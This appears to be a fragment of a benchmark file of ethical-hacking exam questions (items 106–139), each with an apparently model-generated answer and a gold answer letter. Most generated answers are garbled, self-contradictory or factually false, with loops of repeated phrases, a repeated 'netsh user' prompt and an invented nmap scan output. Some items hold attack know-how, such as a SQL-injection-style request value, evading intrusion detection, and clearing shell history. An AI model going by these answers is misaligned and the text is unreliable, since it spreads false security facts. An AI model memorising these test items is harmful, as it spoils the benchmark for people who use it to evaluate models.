+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, C, D.  -sA is a command that sends ICMP echo packets to the target host and returns the number of responses
+received. It is used for testing stateless firewalls.
+A, B, C, D is incorrect because the -sT flag is used to test for stateful firewalls. A stateful firewall will respond to a SYN
+request with an RST packet and an ICMP error message. A stateless firewall will respond with an ICMP message. The -sF
+flag is used to test for both stateful and stateless firewalls. The -sX flag is used to test for ICMP fragmentation. This flag
+is used to test for ICMP fragmentation, which can be used to test for stateful firewalls. The -sS flag is used to test for TCP
+stateful firewalls. This flag is used to test for TCP stateful firewalls.",A
+106,"What type of virus is most likely to remain undetected by antivirus software?
+A.  Cavity virus
+B.  Stealth virus
+C.  File-extension virus
+D.  Macro virus
+","This is a question about cybersecurity. Please write an answer.
+
+  A, B, C, D. A cavity virus is a virus that uses a hidden file to infect a system. The file is
+embedded in a file with a known extension (such as.exe or.dll), and it can be hidden
+in a way that it doesn’t show up in the Windows virus scanner. The file can be placed
+in a directory and not show up as a virus, or it can be placed in a file with a known extension
+and not show up in the virus scanner. It’s not a macro virus, because it doesn’t use a macro
+file to infect a system.
+B is incorrect because a stealth virus is a virus that hides itself from the antivirus software.
+C is incorrect because a file-extension virus doesn’t exist.
+D is incorrect because a macro virus is a virus that uses a macro file to infect a system. A macro
+file is a program that can be",B
+107,"Which of the following types of SQL injection attacks extends the results returned by the original query,
+enabling attackers to run two or more statements if they have the same structure as the original one?
+A.  Error-based injection
+B.  Boolean-based blind SQL injection
+C.  Blind SQL injection
+D.  Union SQL injection
+","# A, B, D. Error-based injection is a type of SQL injection attack in which the SQL code is designed to produce a
+error message, and the attacker uses the error message to manipulate the SQL code to achieve his or her goal. Boolean-based
+blind SQL injection is a type of SQL injection in which the attacker uses a boolean expression as part of the SQL code.
+This allows the attacker to manipulate the SQL code to achieve his or her goal. Union SQL injection is a type of SQL injection
+in which the attacker uses two or more SQL statements to achieve his or her goal. In this case, the attacker uses the
+result of the original query to create a new query that produces the desired result. This is a common method for
+carrying out SQL injection attacks. The original query is a single query, but the second query is a union of the original
+query and the results of the original query. This is a common method for carrying out SQL injection attacks.",D
+108,"To hide the file on a Linux system, you have to start the filename with a specific character. What is the
+character?
+A.  Exclamation mark (!)
+B.  Underscore (_)
+C.  Tilde H
+D.  Period (.)
+","D.  The period is used to hide the file name. The period is not a special character in Linux filenames. A tilde is used to
+change the case of the file name. An exclamation mark is used to change the case of the file name. A tilde is used
+to change the case of the file name. A tilde is used to change the case of the file name. A tilde is used to change
+the case of the file name. A tilde is used to change the case of the file name. A tilde is used to change the case
+of the file name. A tilde is used to change the case of the file name. A tilde is used to change the case of the file
+name. A tilde is used to change the case of the file name. A tilde is used to change the case of the file name.",D
+109,"Bob, your senior colleague, has sent you a mail regarding a deal with one of the clients. You are requested to
+accept the offer and you oblige. After 2 days, Bab denies that he had ever sent a mail. What do you want to
+??know?? to prove yourself that it was Bob who had send a mail?
+A.  Non-Repudiation
+B.  Integrity
+C.  Authentication
+D.  Confidentiality
+","A, B, D. The mail was not sent by Bob, so you can’t use non-repudiation to prove it. Bob was a
+reliable party, so you can’t use integrity to prove it. Authentication is not applicable. Confidentiality is
+not applicable here, because the mail was not sent to you. Therefore, you can’t use confidentiality as an
+argument. The only thing left is authentication, and that’s what you have to use to prove it. You can’t
+use any of the other options. The mail was sent by Bob, so he’s the only person who can prove it, and that
+is authentication. Authentication is the only way to prove it.
+B is incorrect because non-repudiation is not applicable. The mail was not sent by Bob, so you can’t use
+non-repudiation to prove it. Bob was a reliable party",A
+110,"You want to analyze packets on your wireless network. Which program would you use?
+A.  Wireshark with Airpcap
+B.  Airsnort with Airpcap
+C.  Wireshark with Winpcap
+D.  Ethereal with Winpcap
+","This is a good question.  Wireshark is a tool you can use to capture traffic on a wireless network.  Airsnort is a sniffer.  Winpcap is a library for Windows.  Ethereal is a sniffer for Unix.  Airpcap is a driver for Windows.  Airpcap is a driver for Windows, but it’s a driver for sniffing.  It’s not a sniffer.  The reason I didn’t include it is because it’s not a sniffer.  It’s a driver.  It’s not a tool.  It’s a driver.  It’s not a tool.  It’s a driver.  It’s not a sniffer.  It’s a driver.  It’s not a tool.  It’s a driver.  It’s not a sniffer.  It’s a driver.  It’s not a tool.  It’s a driver.  It’s not a tool",A
+111,"Henry is a penetration tester who works for XYZ organization. While performing enumeration on a client
+organization, he queries the DNS server for a specific cached DNS record. Further, by using this cached
+record, he determines the sites recently visited by the organization's user. What is the enumeration technique
+used by Henry on the organization?
+A.  DNS zone walking
+B.  DNS cache snooping
+C.  DNS SEC zone walking
+D.  DNS cache poisoning
+","The third-party DNS server will be queried for the cached record. The result of the query will be the
+website address of the user’s machine. This is a simple form of DNS zone walking, which is when a
+client queries a DNS server for a specific DNS record, and the response is used to determine the sites
+recently visited by the client. In this case, the client is querying the DNS server for the cached record,
+which is the website address of the user’s machine. The DNS zone walking technique is not used for
+enumeration. DNS zone walking is used to search for and retrieve a specific record in the DNS database.
+The DNS SEC zone walking technique is used to search for and retrieve a specific record in the DNS database
+that is encrypted. The DNS cache poisoning technique is used to inject DNS records into the DNS
+database of a client or server. In this case, the client is injecting the website address of the machine into
+the DNS database. This",B
+112,"Insecure direct object reference is a type of vulnerability where the application does not verify if the user is
+authorized to access the internal object via its name or key. Suppose a malicious user Rob tries to get access to
+the account of a benign user Ned.
+Which of the following requests best illustrates an attempt to exploit an insecure direct object reference
+vulnerability?
+A.  ?GET /restricted/goldtransfer?to=Rob&from=1 or 1=1? HTTP/1.1Host: westbank.com?
+B.  ?GET /restricted/\r\n\%00account%00Ned%00access HTTP/1.1 Host: westbank.com?
+C.  ?GET /restricted/accounts/?name=Ned HTTP/1.1 Host westbank.com?
+D.  ?GET /restricted/ HTTP/1.1 Host: westbank.com
+","The first one is incorrect because it uses a GET request to access the account of a user. The second
+one uses a GET request to access the restricted object. The third one is incorrect because it uses a GET
+request to access the account of the user. The fourth one is incorrect because it uses a POST request to
+access the account of the user. In this example, the user is Ned. The first two requests do not use a
+GET request. The second and third requests are both incorrect because they do not use a GET request. The
+fourth request is incorrect because it uses a POST request. The fifth and sixth requests are incorrect because
+they do not use a GET request. The seventh and eighth requests are incorrect because they do not use a GET
+request. The ninth and tenth requests are incorrect because they do not use a GET request. The eleventh
+and twelfth requests are incorrect because they do not use a GET request. The thirteenth and",C
+113,"An organization has automated the operation of critical infrastructure from a remote location. For this purpose,
+all the industrial control systems are connected to the Internet. To empower the manufacturing process, ensure
+the reliability of industrial networks, and reduce downtime and service disruption, the organization deckled to
+install an OT security tool that further protects against security incidents such as cyber espionage, zero-day
+attacks, and malware. Which of the following tools must the organization employ to protect its critical
+infrastructure?
+A.  Robotium
+B.  BalenaCloud
+C.  Flowmon
+D.  IntentFuzzer
+","def A. The Flowmon tool is an intrusion detection system that monitors network traffic and provides real-time alerts
+about security incidents. It is not designed to protect against security incidents such as cyber espionage, zero-day
+attacks, and malware. BalenaCloud is a cloud-based service that provides cloud-based security tools for the
+deployment of security solutions. Robotium is a tool for testing mobile applications. IntentFuzzer is a tool for fuzzing
+applications. All of these tools are designed to protect against security incidents, but they are not designed to
+protect against the specific type of attacks you’ve listed. For example, Flowmon is designed to monitor network traffic
+and provide real-time alerts about security incidents, but it does not protect against cyber espionage or zero-day
+attacks. BalenaCloud is a cloud-based service that provides cloud-based security tools for the deployment of
+security solutions. Robotium is a tool for testing mobile applications. IntentFuzzer is a tool for fuzzing",C
+114,"Sophia is a shopping enthusiast who spends significant time searching for trendy outfits online. Clark, an
+attacker, noticed her activities several times and sent a fake email containing a deceptive page link to her
+social media page displaying all-new and trendy outfits. In excitement, Sophia clicked on the malicious link
+and logged in to that page using her valid credentials. Which of the following tools is employed by Clark to
+create the spoofed email?
+A.  PyLoris
+B.  Slowloris
+C.  Evilginx
+D.  PLCinject
+","Question:
+ A, B, D. Slowloris is a tool that will send multiple email messages to a server in a short amount of time. This
+allows the attacker to send multiple messages to the server at once, effectively saturating the server’s resources
+and slowing it down. Slowloris is used to send multiple messages to the server, which in turn sends
+multiple responses back to the attacker. Slowloris can be used to perform a denial of service attack.
+PyLoris is an automated web application attack tool that is used to flood the server with a large amount of
+traffic, which in turn slows down the server and makes it difficult for the user to do anything on the
+website. PLCinject is used to inject code into the server. The code injects itself into the server and
+creates a vulnerability in the code. Evilginx is used to exploit vulnerabilities in the code. The code
+injects itself into the server and creates a vulnerability in the",C
+115,"You are using a public Wi-Fi network inside a coffee shop. Before surfing the web, you use your VPN to
+prevent intruders from sniffing your traffic. If you did not have a VPN, how would you identify whether
+someone is performing an ARP spoofing attack on your laptop?
+A.  You should check your ARP table and see if there is one IP address with two different MAC addresses.
+B.  You should scan the network using Nmap to check the MAC addresses of all the hosts and look for duplicates.
+C.  You should use netstat to check for any suspicious connections with another IP address within the LAN.
+D.  You cannot identify such an attack and must use a VPN to protect your traffic, r
+","The only way to identify ARP spoofing is to scan for ARP table entries on the network. If you are using a VPN, you will not have the same ARP table entries as an unencrypted connection. If you are not using a VPN, you can use netstat to see if there is any traffic on the interface. A connection with an ARP spoofing attack is looking for a connection with an IP address that is not in the ARP table. A scan with Nmap will show you all the MAC addresses on the network and look for duplicate MAC addresses. A connection to a different IP address within the LAN would be suspicious. You cannot identify ARP spoofing on a VPN connection, because the VPN will not have the same ARP table entries as an unencrypted connection. A connection to a different IP address within the LAN is not suspicious. You can use netstat to see if there is any traffic on the interface, but you would not know if the traffic was legitimate or not. A connection",A
+116,"To create a botnet. the attacker can use several techniques to scan vulnerable machines. The attacker first
+collects Information about a large number of vulnerable machines to create a list. Subsequently, they infect the
+machines. The list Is divided by assigning half of the list to the newly compromised machines. The scanning
+process runs simultaneously. This technique ensures the spreading and installation of malicious code in little
+time.
+Which technique is discussed here?
+A.  Hit-list-scanning technique
+B.  Topological scanning technique
+C.  Subnet scanning technique
+D.  Permutation scanning technique
+","This is a true question. The hit-list scanning technique is used to scan a large number of machines at once.
+This is a very good way to create a botnet, and it’s one of the easiest. The hit-list scanning technique is
+also referred to as a “ping scan,” and it’s used to gather information about a large number of machines in a
+short amount of time. The attacker sends out a series of pings to all machines on a subnet, and they wait for a response.
+If the response is a positive acknowledgment, then the machine is added to the hit list. The ping is sent to
+a specific IP address, and the response is a positive acknowledgment. If the response is a negative acknowledgment,
+the machine is not added to the hit list. The hit-list is then divided into two lists, and half of the machines
+are assigned to the newly compromised machines. The second half is assigned to the machines that have not been
+compromised.",A
+117,"Mason, a professional hacker, targets an organization and spreads Emotet malware through malicious script.
+After infecting the victim's device. Mason further used Emotet to spread the infection across local networks
+and beyond to compromise as many machines as possible. In this process, he used a tool, which is a
+self-extracting RAR file, to retrieve information related to network resources such as writable share drives.
+What is the tool employed by Mason in the above scenario?
+A.  NetPass.exe
+B.  Outlook scraper
+C.  WebBrowserPassView
+D.  Credential enumerator
+","def C:\> netsh
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\> netsh user
+C:\>",D
+118,"Elante company has recently hired James as a penetration tester. He was tasked with performing enumeration
+on an organization's network. In the process of enumeration, James discovered a service that is accessible to
+external sources. This service runs directly on port 21. What is the service enumerated byjames in the above
+scenario?
+A.  Border Gateway Protocol (BGP)
+B.  File Transfer Protocol (FTP)
+C.  Network File System (NFS)
+D.  Remote procedure call (RPC)
+","The service James discovered is an FTP server. FTP is a protocol that allows users to transfer files between
+two machines. It is used for file sharing and file transfer. It is considered a protocol rather than a service
+because it is not a service that is running on a port. In this case, the port is 21. It is a service that is available to
+external users.
+A, B, C, D is incorrect because these services do not exist. B is incorrect because BGP is a routing protocol.
+E is incorrect because RPC is a protocol used to provide a service.
+CEH Certified Ethical Hacker Practice Exams
+CEH Certified Ethical Hacker Practice Exams
+CEH Certified Ethical Hacker Practice Exams
+CEH Certified Ethical Hacker Practice Exams",B
+119,"An unauthorized individual enters a building following an employee through the employee entrance after the
+lunch rush. What type of breach has the individual just performed?
+A.  Reverse Social Engineering
+B.  Tailgating
+C.  Piggybacking
+D.  Announced
+","This is a fairly common type of attack and is often referred to as tailgating. The individual walks through the
+employee entrance and follows the employee through the rest of the building. In this type of attack, the attacker is
+not trying to steal something or gain access to something; the goal is to simply be a part of the building. This is
+done by following the employee around and allowing them to do whatever they need to do. The attacker may also
+take a seat at the lunch table to wait for an opportunity to gain access to the building. The goal of the attacker is to
+be a part of the building for as long as possible, so it is not unusual to see a number of people in the building
+waiting for the lunch rush to start. The attacker could also simply wait for the lunch rush to start and then
+enter the building to steal something. The goal of the attacker is not to steal anything or gain access to anything
+other than the building",B
+120,"By performing a penetration test, you gained access under a user account. During the test, you established a
+connection with your own machine via the SMB service and occasionally entered your login and password in
+plaintext.
+Which file do you have to clean to clear the password?
+A.  .X session-log
+B.  .bashrc
+C.  .profile
+D.  .bash_history
+","Question:
+ C. The bash_history file is used to store the history of commands entered on the shell. It is a text file that
+contains the commands entered by the user during the execution of the shell. As a result, it’s a good place to
+store passwords. It is not a password-protected file and is not encrypted. Therefore, it would be easy to
+read and clear if you wanted to.
+A is incorrect because the.X session-log file is used to store the session log for X sessions. An X session is
+a connection established between the client and the server. An X session log is a text file that stores the
+information about the sessions. It is not a password-protected file and is not encrypted. Therefore, it would be
+easy to read and clear if you wanted to.
+B is incorrect because the bashrc file is a bash shell configuration file. It is used to store the user’s
+environment variables. It is not a password",D
+121,"Websites and web portals that provide web services commonly use the Simple Object Access Protocol
+(SOAP).
+Which of the following is an incorrect definition or characteristics of the protocol?
+A.  Exchanges data between web services
+B.  Only compatible with the application protocol HTTP
+C.  Provides a structured model for messaging
+D.  Based on XML
+","# A, B, D. SOAP is an XML-based protocol. It is a standard protocol that provides a way to exchange
+data between web services. It is based on XML. The protocol is not limited to web services. It is also
+used for data exchange between applications. SOAP is not the only protocol that provides structured
+modeling for messaging. The SOAP protocol is used to exchange data between web services. SOAP is
+based on XML. SOAP is not limited to web services. SOAP is not compatible with HTTP.
+A is incorrect because SOAP is an XML-based protocol. SOAP is a protocol used to exchange data
+between web services. SOAP is not limited to web services. SOAP is not compatible with HTTP. SOAP
+is used for data exchange between applications. SOAP is not based on XML. SOAP is a protocol that
+allows the exchange of structured data between web services. SOAP is not limited to web services. SOAP
+is not compatible with HTTP. SOAP is used for data",B
+122,"Attacker Simon targeted the communication network of an organization and disabled the security controls of
+NetNTLMvl by modifying the values of LMCompatibilityLevel, NTLMMinClientSec, and
+RestrictSendingNTLMTraffic. He then extracted all the non-network logon tokens from all the active
+processes to masquerade as a legitimate user to launch further attacks. What is the type of attack performed by
+Simon?
+A.  Internal monologue attack
+B.  Combinator attack
+C.  Rainbow table attack
+D.  Dictionary attack
+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, D. The internal monologue attack is a type of attack where the attacker sends a series of
+requests to the target’s system to see if the target is aware of the attacker’s existence. This is
+done by sending the target a series of login requests and seeing if the target responds with a valid
+password. This is a very basic attack and does not involve any exploitation of vulnerabilities. It is also
+not a rainbow table attack, because the attacker does not have a rainbow table of passwords.
+A combinatorial attack is an attack where the attacker uses a dictionary of words to attack the target.
+The attacker sends a series of logon requests to the target’s system to see if the target is aware of the
+attacker’s existence. This is done by sending a series of logon requests to the target’s system and
+seeing if the target responds with a valid password. This is a very",A
+123,"Which of the following Bluetooth hacking techniques does an attacker use to send messages to users without
+the recipient?s consent, similar to email spamming?
+A.  Bluesmacking
+B.  BlueSniffing
+C.  Bluejacking
+D.  Bluesnarfing
+","defuse. Bluejacking is a method of sending messages to a Bluetooth device, similar to email spamming. BlueSniffing
+is a method of capturing data on a Bluetooth device. BlueSniffing is used to capture data and then send it to a
+server. Bluesmacking is a method of sending messages to a Bluetooth device without the recipient?s consent.
+Bluejacking is a method of sending messages to a Bluetooth device, similar to email spamming. Bluesnarfing is a
+method of stealing passwords and other data from a Bluetooth device. None of these are true. Bluesmacking is
+a method of sending messages to a Bluetooth device without the recipient?s consent, similar to email spamming.
+BlueSniffing is a method of capturing data on a Bluetooth device. Bluejacking is a method of sending messages
+to a Bluetooth device, similar to email spamming. Bluesnarfing is a method of stealing passwords and other
+data from a",C
+124,"A Security Engineer at a medium-sized accounting firm has been tasked with discovering how much
+information can be obtained from the firm?s public facing web servers. The engineer decides to start by using
+netcat to port 80.
+The engineer receives this output:
+HTTP/1.1 200 OK
+Server: Microsoft-IIS/6
+Expires: Tue, 17 Jan 2011 01:41:33 GMT
+Date: Mon, 16 Jan 2011 01:41:33 GMT
+Content-Type: text/html
+Accept-Ranges: bytes
+Last Modified: Wed, 28 Dec 2010 15:32:21 GMT
+ETag:?b0aac0542e25c31:89d?
+Content-Length: 7369
+Which of the following is an example of what the engineer performed?
+A.  Banner grabbing
+B.  SQL injection
+C.  Whois database query
+D.  Cross-site scripting
+","This is a simple and effective way to get information from a web server. The information is available in the HTTP headers and
+response. The response can be parsed to extract information, which may include a host name, version, and other information.
+The response may also include information about the web server, including the version, operating system, and so on.
+The response may also include information about the date and time of the request. The response can also include
+information about the client, including the IP address of the client. The response may also include information about
+the response headers, including the length of the response and the date of the response.
+A banner grabbing is a simple method of getting information from a web server. The banner is the first line of text
+in the response, which contains a lot of information, including the version of the web server, operating system, and so
+on. This is a simple way to get information from a web server. It is not a way",A
+125,"Which of the following Metasploit post-exploitation modules can be used to escalate privileges on Windows
+systems?
+A.  getsystem
+B.  getuid
+C.  keylogrecorder
+D.  autoroute
+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, C, D.  getsystem is a module that can be used to escalate privileges on Windows systems. This is not a
+post-exploitation module. The other options are all post-exploitation modules. In the post-exploitation
+module, you use a module to perform a task after an exploit has been performed. The module can be used
+to escalate privileges, but it is not used for that purpose. The other modules are not post-exploitation modules.
+getuid is a module that can be used to get the user ID of the system. This is not a post-exploitation module.
+keylogrecorder is a module that can be used to record keyloggers. This is not a post-exploitation module.
+autoroute is a module that can be used to route traffic. This is not a post-exploitation module.",A
+126,"What type of a vulnerability/attack is it when the malicious person forces the user?s browser to send an
+authenticated request to a server?
+A.  Session hijacking
+B.  Server side request forgery
+C.  Cross-site request forgery
+D.  Cross-site scripting
+","def: The session hijacking is a vulnerability where the malicious person forces the user?s browser to send an
+authenticated request to a server. This is a type of cross-site request forgery attack, but it?s not a cross-site scripting
+attack. The malicious person can do this because the browser will send the authenticated request to a server. In
+this case, the server is the server that the user is trying to log into. The server will then send the user?s session
+token to the malicious person, who can then use it to log into the server. The session hijacking attack is a type of
+session hijacking. In this case, the malicious person uses the session token to log into the server. The session
+token is sent to the server and then the malicious person can use it to log into the server. The session token is
+not a cross-site scripting attack. In this case, the malicious person does not use a cross-site scripting attack to
+force",C
+127,"Which of the following options represents a conceptual characteristic of an anomaly-based IDS over a
+signature-based IDS?
+A.  Produces less false positives
+B.  Can identify unknown attacks
+C.  Requires vendor updates for a new threat
+D.  Cannot deal with encrypted network traffic
+","Question: B. An anomaly-based IDS is designed to identify and respond to unknown attacks, so it doesn’t require vendor updates for a new threat. It doesn’t produce false positives, and it can’t deal with encrypted traffic. It’s also true that it can’t be used to identify unknown attacks, but that’s not a requirement for an IDS. The key point to remember is that an IDS is a monitoring system that detects attacks, and it’s not a threat detection system. In addition, an IDS doesn’t need to be updated to handle new threats. It’s not a threat detection system, and it doesn’t deal with encrypted traffic. It’s a monitoring system, not a threat detection system.
+A, B, C, D.  is incorrect because the other options are incorrect. A, B, and C are incorrect because they are false positives. An IDS doesn’t identify unknown attacks, and it doesn’t require vendor updates for a new threat. A false positive is a",B
+128,"Bill has been hired as a penetration tester and cyber security auditor for a major credit card company. Which
+information security standard is most applicable to his role?
+A.  FISMA
+B.  HITECH
+C.  PCI-DSS
+D.  Sarbanes-OxleyAct
+","This is a question about cybersecurity. Please write an answer.
+
+  A, B, C, D.  The Payment Card Industry Data Security Standard (PCI-DSS) is the standard that applies to
+information security to organizations that accept credit cards. The PCI-DSS is a set of standards and requirements
+for organizations that are involved in the processing of credit card information. The standards and requirements
+were created by the PCI Security Standards Council, which is a non-profit organization formed in 2006 to
+establish and maintain a set of standards for protecting credit card information. PCI-DSS applies to organizations
+that accept credit cards for payment, and the standards apply to the physical location of the organization, the
+information technology systems, and the business processes. It also applies to the employees who are involved
+in the handling of credit card information. The PCI-DSS is a compliance standard, and it does not require
+any third-party certification to be valid. The HITECH Act was",C
+129,"When conducting a penetration test, it is crucial to use all means to get all available information about the
+target network. One of the ways to do that is by sniffing the network. Which of the following cannot be
+performed by the passive network sniffing?
+A.  Identifying operating systems, services, protocols and devices
+B.  Modifying and replaying captured network traffic
+C.  Collecting unencrypted information about usernames and passwords
+D.  Capturing a network traffic for further analysis
+","The answer is C. While it is possible to capture network traffic for further analysis, this is not a means to identify
+operating systems, services, protocols, and devices. The other options are all true. Passive network sniffing is a means
+to capture traffic, but it does not provide any information about the operating system, services, protocols, or devices.
+As a matter of fact, it is not possible to capture any information about usernames and passwords. The other options are
+all true, but they are not the same as the question asks about. Identifying operating systems, services, protocols, and
+devices is a means to gather information about the target network, but it is not a means to capture traffic for further
+analysis. Modifying and replaying captured network traffic is not a means to capture traffic, but it is a means to
+modify traffic. Collecting unencrypted information about usernames and passwords is not a means to capture
+traffic for further analysis. The best",B
+130,"Dayn, an attacker, wanted to detect if any honeypots are installed in a target network. For this purpose, he used
+a time-based TCP fingerprinting method to validate the response to a normal computer and the response of a
+honeypot to a manual SYN request. Which of the following techniques is employed by Dayn to detect
+honeypots?
+A.  Detecting honeypots running on VMware
+B.  Detecting the presence of Honeyd honeypots
+C.  Detecting the presence of Snort_inline honeypots
+D.  Detecting the presence of Sebek-based honeypots
+","# A. In order to detect honeypots, Dayn uses a time-based TCP fingerprinting method to validate the response
+to a normal computer and the response of a honeypot to a manual SYN request. The time-based TCP fingerprinting
+method is a method that sends a SYN packet to a honeypot and then waits for a response. If a response is
+received, the time of the response is compared against a database of responses to determine whether the response
+is a honeypot response. If the response is not a honeypot response, the response time is compared against a
+database of responses to determine whether the response is normal. If the response is a honeypot response, the
+time of the response is compared against a database of honeypot responses to determine whether the response is
+honey. In other words, Dayn is using the time of the response to determine if the response is a honeypot response.
+This is a time",C
+131,"Kate dropped her phone and subsequently encountered an issue with the phone's internal speaker. Thus, she is
+using the phone's loudspeaker for phone calls and other activities. Bob, an attacker, takes advantage of this
+vulnerability and secretly exploits the hardware of Kate's phone so that he can monitor the loudspeaker's
+output from data sources such as voice assistants, multimedia messages, and audio files by using a malicious
+app to breach speech privacy. What is the type of attack Bob performed on Kate in the above scenario?
+A.  Man-in-the-disk attack
+B.  aLTEr attack
+C.  SIM card attack
+D.  Spearphone attack
+","The SIM card attack is a type of spearphone attack. It is a type of attack where the attacker has physical access to a phone
+and uses the SIM card to intercept the audio and video streams. This is the type of attack used in the movie
+The Internets. In the movie, the attacker uses a SIM card to intercept the audio and video streams from the phone. The
+SIM card is inserted into the phone, and the attacker uses a malicious app to monitor the phone’s audio and video
+streams. The attacker is able to intercept the phone’s audio and video streams, which allows the attacker to
+eavesdrop on the phone’s conversations.
+A is incorrect because a man-in-the-disk attack is a type of spearphone attack where the attacker uses a physical
+access to the target’s computer to intercept data. The attacker would use a physical access to the target’s computer
+to get access to the data. In this attack, the attacker would have physical access",D
+132,"Cross-site request forgery involves:
+A.  A request sent by a malicious user from a browser to a server
+B.  Modification of a request by a proxy between client and server
+C.  A browser making a request to a server without the user?s knowledge
+D.  A server making a request to another server without the user?s knowledge
+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, D. Cross-site request forgery is a form of attack that uses a browser to send a request to a server without the user?s knowledge. The server can be tricked into sending the response back to the browser, or it can be tricked into sending the response to the browser without the user?s knowledge. The user?s browser is not involved in the attack. The browser sends the request to the server, and the server sends the response to the browser. The browser can also send the request to the server without the user?s knowledge. The browser can also send the request to the server without the user?s knowledge. The browser can also send the request to the server without the user?s knowledge. The browser can also send the request to the server without the user?s knowledge. The browser can also send the request to the server without the user?s knowledge. The browser can also send the request to the server",C
+133,"Which type of attack attempts to overflow the content-addressable memory (CAM) table in an Ethernet
+switch?
+A.  Evil twin attack
+B.  DNS cache flooding
+C.  MAC flooding
+D.  DDoS attack
+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, D. This is an evil twin attack, which is an attack on the MAC address of the switch. The attacker will inject a
+packet that looks like a legitimate MAC address to the switch, causing the switch to believe it is a legitimate
+device. The switch will forward the packet to the victim, who will then send the packet back to the attacker, which
+will result in a flood of traffic. The attacker will then have access to the victim’s network and gain access to
+the system. The MAC flooding is a part of the ARP poisoning attack, which is an attack on the ARP table. The
+attack will inject a packet that will overwrite the ARP table in the switch, causing the switch to believe it is
+sending a legitimate ARP packet, which will result in the victim sending the packet to the attacker. The attacker
+will then have access to the victim’s network and gain access to the",C
+134,"How can rainbow tables be defeated?
+A.  Use of non-dictionary words
+B.  All uppercase character passwords
+C.  Password salting
+D.  Lockout accounts under brute force password cracking attempts
+","Question: A. Rainbow tables are designed to store word lists for cracking passwords. Rainbow tables
+are not designed to defeat brute force attacks. All uppercase characters and non-dictionary words
+are used to increase the speed of the attack. Password salting is designed to prevent rainbow tables
+from being used to crack passwords. Lockout accounts are not designed to defeat brute force
+attacks. Lockout accounts are used to prevent brute force attacks on a single account.
+A rainbow table is a list of precomputed dictionary words that are used to crack passwords. It
+is not designed to defeat brute force attacks. Password salting is a way to prevent rainbow tables from
+being used to crack passwords. Lockout accounts are used to prevent brute force attacks on a single
+account. The lockout account is not designed to defeat brute force attacks.",C
+135,"Miley, a professional hacker, decided to attack a target organization's network. To perform the attack, she used
+a tool to send fake ARP messages over the target network to link her MAC address with the target system's IP
+address. By performing this, Miley received messages directed to the victim's MAC address and further used
+the tool to intercept, steal, modify, and block sensitive communication to the target system. What is the tool
+employed by Miley to perform the above attack?
+A.  Gobbler
+B.  KDerpNSpoof
+C.  BetterCAP
+D.  Wireshark
+","from the target network. The tool is used to intercept, steal, modify, and block traffic to and from the target system.
+Miley used the tool to send fake ARP messages over the target network to link her MAC address with the target
+system’s IP address. By performing this, Miley received messages directed to the victim’s MAC address and further
+used the tool to intercept, steal, modify, and block sensitive communication to the target system.",C
+136,"The network in ABC company is using the network address 192.168.1.64 with mask 255.255.255.192. In the
+network the servers are in the addresses 192.168.1.122, 192.168.1.123 and 192.168.1.124. An attacker is
+trying to find those servers but he cannot see them in his scanning. The command he is using is: nmap
+192.168.1.64/28.
+Why he cannot see the servers?
+A.  He needs to add the command ??ip address?? just before the IP address
+B.  He needs to change the address to 192.168.1.0 with the same mask
+C.  He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range
+D.  The network must be dawn and the nmap command and IP address are ok
+","# nmap 192.168.1.64/28
+Starting nmap scan at 2019-01-18 11:44:14
+Nmap scan report
+Nmap scan completed: 1 IP addresses (1 host) scanned in 0.07 seconds
+Not enough information available to provide a scan ID
+Host 192.168.1.64 is up (0.0.0.0) for 0.00s
+Host 192.168.1.122 is up (0.0.0.0) for 0.00s
+Host 192.168.1.123 is up (0.0.0.0) for 0.00s
+Host 192.168.1.124 is up (0.0.0.0) for 0.00s
+Nmap scan completed: 1 IP addresses (1 host) scanned in 0.07 seconds
+A",C
+137,"Ben purchased a new smartphone and received some updates on it through the OTA method. He received two
+messages: one with a PIN from the network operator and another asking him to enter the PIN received from
+the operator. As soon as he entered the PIN, the smartphone started functioning in an abnormal manner. What
+is the type of attack performed on Ben in the above scenario?
+A.  Advanced SMS phishing
+B.  Bypass SSL pinning
+C.  Phishing
+D.  Tap 'n ghost attack
+","This is a question about cybersecurity. Please write an answer.
+
+ C. Tap n’ ghost is a term used for the practice of intercepting and redirecting SMS messages on a cellular phone
+network, without the owner’s knowledge. The attacker may do this by spoofing the network provider’s server, or
+by using a man-in-the-middle attack. The attacker may also use a SIM swap attack, where the attacker swaps out
+the original SIM card with a new one and uses the new SIM card to send SMS messages to the original owner. The
+owner may not even be aware of the attack until the SIM card is swapped out. In this case, the attacker may use
+the original SIM card to send the PIN message, which the owner will then use to unlock the phone.
+A, B, D. The attacker is not using any of these methods. The attacker is not using a man-in-the-middle attack.
+A man-in-the-middle attack occurs when the attacker intercepts",A
+138,"Attempting an injection attack on a web server based on responses to True/False QUESTION NO:s is called
+which of the following?
+A.  Compound SQLi
+B.  Blind SQLi
+C.  Classic SQLi
+D.  DMS-specific SQLi
+","This is a question about cybersecurity. Please write an answer.
+
+ A, B, D. The Blind SQLi is a type of injection attack that uses a series of True/False statements to create
+a SQL injection. The injection is done by inserting a string into the web page that will return a value that is
+used to create a SQL injection. The injection is done with a string that looks like a True/False statement.
+A True/False statement is used to determine the results of a query. The query will be run and the results
+returned. The string is then used to create a SQL injection. This is done with a series of True/False
+statements. The results of the query are used to create a SQL injection.
+C is incorrect because the Classic SQLi is a type of injection attack that uses a series of SQL statements to
+create an injection.
+D is incorrect because the DMS-specific SQLi is a type of injection attack that uses a series of True",B
+139,"You have compromised a server and successfully gained a root access. You want to pivot and pass traffic
+undetected over the network and evade any possible Intrusion Detection System. What is the best approach?
+A.  Use Alternate Data Streams to hide the outgoing packets from this server.
+B.  Use HTTP so that all traffic can be routed vis a browser, thus evading the internal Intrusion Detection Systems.
+C.  Install Cryptcat and encrypt outgoing packets from this server.
+D.  Install and use Telnet to encrypt all outgoing traffic from this server.
